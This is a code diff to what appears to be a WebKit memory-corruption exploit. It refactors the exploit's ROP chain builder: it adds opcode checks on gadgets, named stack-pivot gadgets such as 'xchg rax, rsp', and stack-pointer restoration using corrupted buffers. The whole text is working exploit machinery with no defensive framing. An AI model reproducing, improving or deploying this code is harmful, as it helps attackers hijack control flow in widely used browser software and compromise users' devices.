@@ -25,7 +25,7 @@ function Storage() {
     }
 }
 
-function gadget(module, offset) {
+function gadget(module, offset, machine) {
     this.addr = function() {
         return this.get_module_base().add(offset);
     }
@@ -37,6 +37,15 @@ function gadget(module, offset) {
             return webkit_base_addr;
         else return 0;
     }
+    
+    if(machine) {
+        this.machine = machine;
+    }
+}
+
+function check(ptr, array)
+{
+  
 }
 
 function RopChain() {
@@ -44,8 +53,24 @@ function RopChain() {
 
     this.add = function(instr) {
         if (typeof(instr) === "string") {
-            this.rop_chain.push(gadgets[instr].addr().getLowBitsUnsigned())
-            this.rop_chain.push(gadgets[instr].addr().getHighBitsUnsigned())
+            var gadget = gadgets[instr];
+            if(typeof(gadget) === 'undefined') {
+              throw "Gadget "+instr+" was not found";
+            }
+            if(typeof(gadget.machine) != "undefined") {
+                var tmp = [];
+                var valid = true;
+                for(var i = 0; i < gadget.machine.length; i++){
+                    if((tmp[tmp.length] = read8(gadget.addr().add(i))) != gadget.machine[i]) valid = false;
+                }
+                var ret = read8(gadget.addr().add(gadget.machine.length));
+                if(ret != 0xc3) valid = false;
+                if(!valid){
+                  throw "Opcode invalid in "+instr+" got "+tmp.reduce(function(p,c){ return p+c.toString(16)+' '},"")+ret.toString(16)
+                }
+            }
+            this.rop_chain.push(gadget.addr().getLowBitsUnsigned())
+            this.rop_chain.push(gadget.addr().getHighBitsUnsigned())
         }
         // If we are only writing a 32bit integer, makes it easier
         else if (typeof(instr) === "number") {
@@ -77,13 +102,13 @@ function RopChain() {
 
 
     this.execute = function() {
-        // xchg rax, rsp; dec dword ptr [rax - 0x77]; ret;
-        rop_buf[2] = cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
-        rop_buf[3] = cbuf[0x11]
+        var xchg = gadgets['xchg rax, rsp; dec dword ptr [rax - 0x77]'];
+        rop_buf[2] = xchg.addr().getLowBitsUnsigned()
+        rop_buf[3] = xchg.addr().getHighBitsUnsigned()
 
-        // pop rcx; pop rcx; ret;
-        rop_buf[0] = cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4;
-        rop_buf[1] = cbuf[0x11]
+        var poprcxx2 = gadgets['pop rcx; pop rcx'];
+        rop_buf[0] = poprcxx2.addr().getLowBitsUnsigned()
+        rop_buf[1] = poprcxx2.addr().getHighBitsUnsigned()
 
         // Code to restore the stack pointer
         this.add('pop rax')
@@ -107,7 +132,6 @@ function RopChain() {
         rop_buf.byteLength;
         cbuf[0x10] = old_low
         cbuf[0x11] = old_high
-
     }
 
     // Code to cleanup the modification done by by the stack pivot
